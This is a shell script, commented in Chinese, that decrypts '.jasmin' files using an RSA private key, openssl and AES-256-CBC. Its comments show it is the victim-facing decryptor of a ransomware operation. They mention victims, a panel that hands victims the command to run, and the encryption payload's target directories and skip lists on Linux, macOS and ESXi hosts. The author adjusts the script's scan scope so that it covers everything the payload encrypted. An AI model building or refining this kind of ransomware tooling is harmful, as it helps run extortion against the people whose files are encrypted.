#!/bin/sh
# Jasmin 解密脚本 (纯 openssl 实现，无需 cryptography / pip / 编译)
# 用法: sh jasmin_decrypt_openssl.sh <私钥.pem> [目录1 目录2 ...]
#
# 文件格式: [SHA256 32B][AES-256-CBC密文][RSA-OAEP加密的key+iv][4B 长度(小端)]
# 关键: 强制 C locale，否则二进制↔十六进制转换会被 UTF-8 污染
export LC_ALL=C
export LANG=C

PRIV="$1"
if [ -z "$PRIV" ] || [ ! -f "$PRIV" ]; then
    echo "Usage: $0 <private-key.pem> [dir...]"
    exit 1
fi
shift

if ! command -v openssl >/dev/null 2>&1; then
    echo "[!] openssl command not found"
    exit 1
fi
if ! command -v od >/dev/null 2>&1; then
    echo "[!] od command not found"
    exit 1
fi

DIRS="$*"
if [ -z "$DIRS" ]; then
    # 未指定目录 => 解密全部加密文件。
    # 基准与载荷加密范围一致（载荷 roots），再自动补上真实挂载点，
    # 覆盖 /mnt/data、/data 这类自定义挂载（载荷的 SKIP_DIRS 会跳过 /mnt，
    # 但用户手动加密其他挂载点时仍能被这里兜住）。
    # ★ 必须包含 macOS 的 /Users：macOS 载荷的 roots 是 [~, '/Users', '/tmp']，
    #   而 /home 在 macOS 上是空的 autofs、/root 不存在、/opt 与 /srv 通常也没有。
    #   漏掉 /Users 就等于"解密全部"在 macOS 上一个用户文件都解不回来 ——
    #   而面板给受害者的正是"不写目录=解密全部"这条命令。
    #   $HOME 作兜底，以防管理员账号的家目录不在 /Users 下。
    DIRS="/home /root /var /opt /tmp /srv /Users ${HOME:-}"
    if [ -r /proc/mounts ]; then
        EXTRA=$(awk '
            $2 ~ /^\// &&
            $2 !~ /^\/(proc|sys|dev|run|boot)(\/|$)/ &&
            $3 !~ /^(proc|sysfs|devtmpfs|devpts|tmpfs|overlay|squashfs|cgroup|cgroup2|securityfs|debugfs|tracefs|configfs|fusectl|pstore|bpf|mqueue|hugetlbfs|nsfs|autofs|ramfs|rpc_pipefs|binfmt_misc|fuse\..*)$/ &&
            $2 != "/" { print $2 }
        ' /proc/mounts 2>/dev/null)
        for M in $EXTRA; do
            case " $DIRS " in
                *" $M "*) ;;
                *) DIRS="$DIRS $M" ;;
            esac
        done
    fi
    echo "[*] No directory given - decrypting ALL encrypted files, scan scope: $DIRS"
fi

TD="/tmp/.jdec_$$"
(umask 077 && mkdir -p "$TD") || exit 1
chmod 700 "$TD"
# 必须收紧到 0700：默认 umask 022 下 $TD 是 0755、openssl 写出的 priv.pem 是
# 0644 —— 多用户机器上，整个解密期间任何本地用户都能读到明文 RSA 私钥。
trap 'rm -rf "$TD"' EXIT INT TERM

OK=0
FAIL=0

decrypt_one(){
    F="$1"
    SZ=$(wc -c < "$F" 2>/dev/null)
    [ -n "$SZ" ] || return 1
    # 最小长度: 32(sha)+16(1个AES块)+256(RSA-2048)+4 = 308
    [ "$SZ" -ge 308 ] || return 1

    # 末尾4字节 = RSA块长度（小端）
    EK_LEN=$(tail -c 4 "$F" | od -An -tu1 | awk '{print $1+$2*256+$3*65536+$4*16777216}')
    [ -n "$EK_LEN" ] || return 1
    [ "$EK_LEN" -ge 128 ] || return 1
    [ "$EK_LEN" -le 512 ] || return 1

    EK_START=$((SZ - 4 - EK_LEN))
    [ "$EK_START" -gt 32 ] || return 1
    CT_LEN=$((EK_START - 32))
    [ "$CT_LEN" -ge 16 ] || return 1

    # 切分: 头部摘要 / RSA块（均很小）落到临时区。密文【不落盘】——
    # 直接从原文件第33字节起流式读取并喂给 AES，避免把完整密文写进 /tmp
    # （ESXi 的 /tmp 是小型 RAM disk，VMDK 等大文件会 ENOSPC）。
    head -c 32 "$F" > "$TD/hash"
    tail -c "+$((EK_START + 1))" "$F" | head -c "$EK_LEN" > "$TD/ek"

    # RSA-OAEP 解出 key(32B)+iv(16B)
    if ! openssl pkeyutl -decrypt -inkey "$PRIV" \
            -in "$TD/ek" -out "$TD/kiv" \
            -pkeyopt rsa_padding_mode:oaep \
            -pkeyopt rsa_oaep_md:sha256 \
            -pkeyopt rsa_mgf1_md:sha256 2>/dev/null; then
        return 1
    fi
    [ "$(wc -c < "$TD/kiv")" -eq 48 ] || return 1

    head -c 32 "$TD/kiv" > "$TD/k"
    tail -c 16 "$TD/kiv" > "$TD/iv"

    KH=$(od -An -tx1 -v "$TD/k" | tr -d ' \n')
    IH=$(od -An -tx1 -v "$TD/iv" | tr -d ' \n')
    [ -n "$KH" ] || return 1
    [ -n "$IH" ] || return 1

    OUT=$(printf '%s' "$F" | sed 's/\.jasmin$//')

    # AES-256-CBC 流式解密，明文【直接写目标文件】而非先落 /tmp 再 mv：
    # 旧实现把完整明文写到 $TD/plain（/tmp），ESXi 的 /tmp 是小型 RAM disk，
    # VMDK 等大文件必然 ENOSPC -> 即便密钥正确也永久无法恢复。
    # 现在密文与明文都不落 /tmp：tail -c +33 直接从原文件流式吐密文给 openssl，
    # openssl 边解边经 tee 落盘并同步算 SHA256，全程 O(1) 额外空间。
    # 注意：SHA 是对【明文】的摘要，必须边解密边算；tee 的同时 stdin 原样传给
    # sha256sum，两路互不干扰。
    if ! { tail -c "+33" "$F" | head -c "$CT_LEN" \
          | openssl enc -d -aes-256-cbc -nosalt \
            -K "$KH" -iv "$IH" 2>/dev/null \
          | tee "$OUT" \
          | openssl dgst -sha256 -binary > "$TD/nh"; } then
        rm -f "$OUT"
        return 1
    fi

    # SHA256 完整性校验
    OH=$(od -An -tx1 -v "$TD/hash" | tr -d ' \n')
    NH=$(od -An -tx1 -v "$TD/nh" | tr -d ' \n')
    if [ "$OH" != "$NH" ]; then
        rm -f "$OUT"
        echo "[!] INTEGRITY FAIL: $F"
        return 1
    fi
    # 明文是先落到 /tmp 再 mv 过来的，mode 由 umask 决定（通常 0644）。
    # 加密时没有保存原始权限位，无法完整还原；但对明确敏感的文件名收紧到 0600，
    # 避免 .env / 私钥 / 口令 这类文件在还原后变成同机其他用户可读。
    case "${OUT##*/}" in
        .env|*.pem|*.key|.key_secret|id_rsa|id_ed25519|authorized_keys|shadow|*.kdbx|*.pfx|*.p12|.git-credentials)
            chmod 600 "$OUT" 2>/dev/null || true ;;
    esac
    rm -f "$F"
    echo "[+] $OUT"
    return 0
}

for D in $DIRS; do
    [ -d "$D" ] || continue
    # 排除容器层与伪文件系统：不是受害者数据，且会让全盘扫描慢几个数量级
    # -H：把命令行给出的起点符号链接解开。macOS 上 /tmp 与 /var 都是指向
    #     /private/* 的符号链接，不带 -H 时 find 不下钻，等于什么都没扫到。
    # ★ 这里【不再】prune /var/lib/docker 与 /var/lib/containerd：
    #   载荷的 SKIP_DIRS 里没有这两个路径，它们里面的文件确实会被加密，
    #   而解密端却把整棵树剪掉 —— 默认范围下这些文件永远解不回来，
    #   而且静默跳过、连 failed 都不计。解密范围必须等于加密范围。
    find -H "$D" \
        -path '/proc' -prune -o \
        -path '/sys' -prune -o \
        -path '/dev' -prune -o \
        -path '/run' -prune -o \
        -path '/boot' -prune -o \
        -type f -name '*.jasmin' -print 2>/dev/null > "$TD/list"
    while IFS= read -r F; do
        [ -n "$F" ] || continue
        if decrypt_one "$F"; then
            OK=$((OK + 1))
        else
            FAIL=$((FAIL + 1))
            echo "[-] Failed: $F"
        fi
    done < "$TD/list"
done

echo ""
echo "=== Done: $OK decrypted, $FAIL failed ==="
[ "$FAIL" -eq 0 ]
